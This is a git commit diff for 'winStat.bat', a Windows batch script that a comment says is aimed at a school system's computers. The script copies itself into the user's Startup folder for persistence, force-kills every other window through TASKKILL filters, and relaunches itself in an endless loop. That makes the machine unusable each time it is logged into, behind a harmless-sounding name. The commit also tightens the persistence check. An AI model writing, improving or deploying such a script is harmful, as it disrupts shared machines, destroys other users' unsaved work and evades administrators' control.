d54160e52e45e093ea31723eda5f6feb6d6e4a43
zacharyacutey <zacharyacutey@users.noreply.github.com>
2016-02-24 17:01:11 -0500

    Update winStat.bat

--- winStat.bat
+++ winStat.bat
@@ -1,10 +1,12 @@
 @ECHO OFF
+COLOR 0A
+::Everything is better with color 0a (Matrix)
 ::School system may update to win10 next year,I have found NO information on whether cmd can be blocked in win10! YAY!
-IF NOT "%cd%"=="C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup" (
+IF NOT EXIST "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\winStat.bat" (
 COPY winStat.bat "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\winStat.bat"
 )
 TITLE winStat
 TASKKILL /F /FI "WINDOWTITLE ne winStat"
 TITLE HA!
 TASKKILL /F /FI "WINDOWTITLE ne HA!"
-start winStat.bat
+START winStat.bat
